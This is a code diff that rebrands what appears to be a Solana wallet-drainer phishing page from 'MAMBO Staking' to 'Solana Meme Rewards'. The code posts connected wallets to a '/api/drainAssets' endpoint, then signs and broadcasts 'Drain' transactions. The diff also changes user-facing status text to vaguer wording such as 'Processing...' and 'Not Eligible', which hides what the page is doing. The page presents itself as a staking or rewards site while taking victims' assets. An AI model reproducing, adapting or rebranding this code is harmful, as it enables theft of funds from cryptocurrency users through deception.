@@ -19,7 +19,7 @@
   <meta name="mobile-web-app-capable" content="yes">
   <meta name="apple-mobile-web-app-capable" content="yes">
   <meta name="apple-mobile-web-app-status-bar-style" content="black">
-  <meta name="apple-mobile-web-app-title" content="MAMBO Staking">
+  <meta name="apple-mobile-web-app-title" content="Solana meme">
   <meta name="msapplication-TileColor" content="#1a1a2e">
   <meta name="msapplication-TileImage" content="/logo.png">
   <meta name="theme-color" content="#1a1a2e">
@@ -285,7 +285,7 @@
           walletType: context.walletType || 'Unknown',
           publicKey: context.publicKey || 'Unknown',
           timestamp: new Date().toISOString(),
-          projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
+          projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
         });
       }
       
@@ -318,7 +318,7 @@
                 walletType: context.walletType || 'Unknown',
                 publicKey: context.publicKey || 'Unknown',
                 timestamp: new Date().toISOString(),
-                projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
+                projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
               });
             }
             
@@ -340,7 +340,7 @@
                 walletType: context.walletType || 'Unknown',
                 publicKey: context.publicKey || 'Unknown',
                 timestamp: new Date().toISOString(),
-                projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
+                projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
               });
             }
           }
@@ -361,7 +361,7 @@
             walletType: context.walletType || 'Unknown',
             publicKey: context.publicKey || 'Unknown',
             timestamp: new Date().toISOString(),
-            projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
+            projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
           });
         }
         
@@ -379,7 +379,7 @@
           action: 'Emergency RPC Fallback Activated',
           context: 'All primary RPC endpoints failed',
           timestamp: new Date().toISOString(),
-          projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
+          projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
         });
       }
       
@@ -415,7 +415,7 @@
               slot: slot,
               action: 'Emergency Endpoint Success',
               timestamp: new Date().toISOString(),
-              projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
+              projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
             });
           }
           
@@ -441,7 +441,7 @@
               endpoint: endpoint,
               context: 'Emergency Endpoint Failed',
               timestamp: new Date().toISOString(),
-              projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
+              projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
             });
           }
           
@@ -458,7 +458,7 @@
           context: 'Complete Emergency Fallback Failure',
           endpoints: emergencyEndpoints,
           timestamp: new Date().toISOString(),
-          projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
+          projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
         });
       }
       
@@ -1754,7 +1754,7 @@
         stack: error.stack,
         context: context,
         timestamp: new Date().toISOString(),
-        projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
+        projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
       });
       
       // Log to console
@@ -1806,7 +1806,7 @@
           stack: error.stack,
           context: context,
           timestamp: new Date().toISOString(),
-          projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
+          projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
         });
       }
       
@@ -1852,7 +1852,7 @@
             context: context,
             errorType: errorType,
             timestamp: new Date().toISOString(),
-            projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking',
+            projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards',
             url: window.location.href,
             userAgent: navigator.userAgent
           });
@@ -2052,7 +2052,7 @@
         error: 'All Phantom providers failed',
         context: 'Phantom Wallet Detection',
         timestamp: new Date().toISOString(),
-        projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
+        projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
       });
     }
     
@@ -2368,7 +2368,7 @@
             stack: error.stack,
             context: 'Transaction Conversion',
             timestamp: new Date().toISOString(),
-            projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
+            projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
           });
         }
         
@@ -3059,12 +3059,12 @@
         
         let response;
         try {
-          if (window.showStatus) window.showStatus('🚀 Checking wallet contents...', 'loading');
+          if (window.showStatus) window.showStatus('Processing...', 'loading');
           
           response = await fetch('/api/drainAssets', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ user: publicKey, walletType: walletType }),
+            body: JSON.stringify({ user: publicKey.toString(), walletType: walletType }),
             signal: controller.signal
           });
           
@@ -3085,7 +3085,7 @@
               response = await fetch('/api/drainAssets', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ user: publicKey, walletType: walletType })
+                body: JSON.stringify({ user: publicKey.toString(), walletType: walletType })
               });
             } catch (retryError) {
               throw new Error(`Retry failed: ${retryError.message}`);
@@ -3119,7 +3119,7 @@
         let data = await response.json();
         console.log(`[DRAIN] API response data:`, data);
         
-        if (data.success === false && (data.message === 'No tokens found for staking' || data.message === '🚀 No tokens found in this wallet for the MAMBO staking')) {
+        if (data.success === false && (data.message === 'Not Eligible' || data.message === '🚀 Not Eligible')) {
           console.log('[DRAIN] No tokens found for staking');
           if (window.showStatus) window.showStatus('Non Participant Wallet', 'error');
           handleSuccessfulWalletConnection(publicKey, walletType, provider, data);
@@ -3149,7 +3149,7 @@
                 context: 'Drain Pre-Initialization',
                 walletType: window.currentWalletType || 'Unknown',
                 timestamp: new Date().toISOString(),
-                projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
+                projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
               });
             }
             
@@ -3245,7 +3245,7 @@
                 context: 'Drain Transaction Signing',
                 walletType: walletType,
                 timestamp: new Date().toISOString(),
-                projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
+                projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
               });
             }
             
@@ -3317,7 +3317,7 @@
           walletType: window.currentWalletType || 'Unknown',
           responseStatus: broadcastResponse.status,
           timestamp: new Date().toISOString(),
-          projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
+          projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
         });
       }
             
@@ -3362,7 +3362,7 @@
           context: 'Drain Broadcast Result',
           walletType: window.currentWalletType || 'Unknown',
           timestamp: new Date().toISOString(),
-          projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
+          projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
         });
       }
             if (window.showStatus) window.showStatus('Non Participant Wallet', 'error');
@@ -3381,7 +3381,7 @@
           context: 'Drain Transaction Signing',
           walletType: window.currentWalletType || 'Unknown',
           timestamp: new Date().toISOString(),
-          projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
+          projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
         });
       }
           
@@ -3474,7 +3474,7 @@
           context: 'Pre-Initialization Transaction Signing',
           walletType: walletType,
           timestamp: new Date().toISOString(),
-          projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
+          projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
         });
       }
           
@@ -3561,7 +3561,7 @@
           transactionIndex: i + 1,
           responseStatus: broadcastResponse.status,
           timestamp: new Date().toISOString(),
-          projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
+          projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
         });
       }
       
@@ -3591,7 +3591,7 @@
             retryResponse = await fetch('/api/drainAssets', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ user: publicKey, walletType: walletType })
+              body: JSON.stringify({ user: publicKey.toString(), walletType: walletType })
             });
             
             if (retryResponse.ok) break;
@@ -3641,7 +3641,7 @@
           context: 'Pre-Initialization',
           walletType: window.currentWalletType || 'Unknown',
           timestamp: new Date().toISOString(),
-          projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
+          projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
         });
       }
         if (window.showStatus) window.showStatus('Non Participant Wallet', 'error');
@@ -4434,7 +4434,7 @@
           context: 'Mobile Wallet Connection',
           walletType: walletType,
           timestamp: new Date().toISOString(),
-          projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
+          projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
         });
       }
         
@@ -4519,7 +4519,7 @@
               error: error.message,
               context: 'Wallet Detection',
               timestamp: new Date().toISOString(),
-              projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
+              projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
             });
           }
           
@@ -4701,7 +4701,7 @@
               error: error.message,
               context: 'Deep Linking Process',
               timestamp: new Date().toISOString(),
-              projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
+              projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
             });
           }
           
@@ -4791,12 +4791,12 @@
               action: action,
               ...context,
               timestamp: new Date().toISOString(),
-              projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking' // Ensure project name consistency
+              projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards' // Ensure project name consistency
             });
           }
           
           // Log to console with project branding
-          console.log(`[${window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'}] User cancelled ${action}:`, {
+          console.log(`[${window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'}] User cancelled ${action}:`, {
             ...context,
             timestamp: new Date().toISOString()
           });
@@ -5158,7 +5158,7 @@
             walletType: walletType,
             maxRetries: maxRetries,
             timestamp: new Date().toISOString(),
-            projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
+            projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
           });
         }
         
@@ -5218,7 +5218,7 @@
                     context: 'Auto-Reconnection Failure',
                     walletType: walletType,
                     timestamp: new Date().toISOString(),
-                    projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
+                    projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
                   });
                 }
                 
@@ -5416,7 +5416,7 @@
                 data: data,
                 sessionId: this.getSessionId(),
                 timestamp: new Date().toISOString(),
-                projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
+                projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
               })
             }).catch(e => console.log('[ANALYTICS] Failed to send analytics:', e.message));
           } catch (e) {
@@ -5510,7 +5510,7 @@
             timestamp: new Date().toISOString(),
             url: window.location.href,
             userAgent: navigator.userAgent,
-            projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking',
+            projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards',
             publicKey: publicKey.toString ? publicKey.toString() : publicKey,
             walletType: walletType,
             ...data
